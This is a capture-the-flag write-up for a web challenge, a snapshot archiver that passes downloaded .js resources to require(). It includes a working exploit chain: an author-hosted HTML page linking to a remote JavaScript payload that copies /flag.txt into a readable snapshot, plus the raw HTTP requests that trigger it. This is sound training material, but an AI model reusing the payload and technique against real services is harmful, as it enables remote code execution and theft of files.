#### WayWayback Machine
- points earned: 318
#### Where's the flag?
- a `flag.txt` file gets copied into the root of the container when it is created.
- No other references to this file exist in the code so I'm looking for an arbitrary file read or code/command execution.
#### Notes / Intuition
- The idea of the app is to take a snapshot of a website and store it for archiving.  But there is some funky logic that leads to code execution to read the flag file.
- The logic to take a snapshot of a website in `visitAndSaveSnapshot`:
	- Puppeteer is used to load the target page.
	- The content is stripped from the page with `const htmlContent = await page.content()`
		- This prevents me from seeing the flag that perhaps gets loaded with an iframe.
	- That content is sanitized with the `sanitize-html` library
		- there are some config items that allow certain tags and attributes
			```js
			allowedTags: sanitizeHtml.defaults.allowedTags.concat(['link', 'meta']),
		    allowedAttributes: {
		      ...sanitizeHtml.defaults.allowedAttributes,
		      link: ['rel', 'href', 'as', 'type', 'crossorigin'],
		      meta: ['name', 'content', 'charset', 'http-equiv']
		    },
			```
	- The saved to file in `/snapshots/`.
	- Then the file is scanned for resources(`archiveResources`) which get stored in `/snapshots` as well.  This is where things start to get a little interesting.
		- The page content is scanned for items that match the regex `/<link[^>]+href=["']([^"']+)["'][^>]*>/gi;`
			- For example, `<link href="http://somePlace.com">`
		- For each resource that was found
			- There is some sanitation on the name that replaces bad chars with `_`
			- Then it is stored in `/snapshots/`
	- Finally, a response is sent back to the user which includes the id for accessing the snapshot.
- A snapshot is viewed with a request to `/snapshot/:id`.  Things get much more interesting here.
	- In this block, there is a call to `preloadSnapshotResources`
	- Inside `preloadSnapshotResources`:
		- The contents of `/snapshots` is read into memory.
		- for each file that exists in this dir, IF that file ends in `.js` then it is provided as an arg to the `require` function.  Super duper dangerous.
- This gives us everything we need to create an exploit that reads the flag file.
#### Solution
- host a couple files
	- File A (meow.html)
		```html
		<link href="https://content.kn0wht1ms4yn.com/jBwpU5I-/meow.js" />
		```
	- File B (meow.js)
		```javascript
		const fs = require('fs');
		
		// Async (recommended)
		console.log('meow');
		fs.copyFile('/flag.txt', '/app/snapshots/flag.html', ()=>{});
		```

- Send request to trigger the snapshot.
	```http
	POST /api/snapshot HTTP/1.1
	Host: waywayback-machine-17b9b0ec7c0212a6.instancer.batmans.kitchen
	Content-Type: application/x-www-form-urlencoded
	
	url=https://content.kn0wht1ms4yn.com/jBwpU5I-/meow.html
	```
	- The app will detect the `<link>`
	- Then send a request to it's `href`
	- Then store the result into `/snapshots/`

- Send a request to view the snapshot.
	```http
	GET /snapshot/d614f29077f41faf HTTP/1.1
	Host: waywayback-machine-17b9b0ec7c0212a6.instancer.batmans.kitchen
	
	
	```
	- This causes the app to scan the `/snapshot/` dir for `.js` files and `require` them into the app.
	- The `meow.js` gets exuted which copies `/flag.txt` to `/app/snapshots/flag.html`

- Send the last request which retrieves the flag.
	```http
	GET /snapshot/flag HTTP/1.1
	Host: waywayback-machine-17b9b0ec7c0212a6.instancer.batmans.kitchen
	
	
	```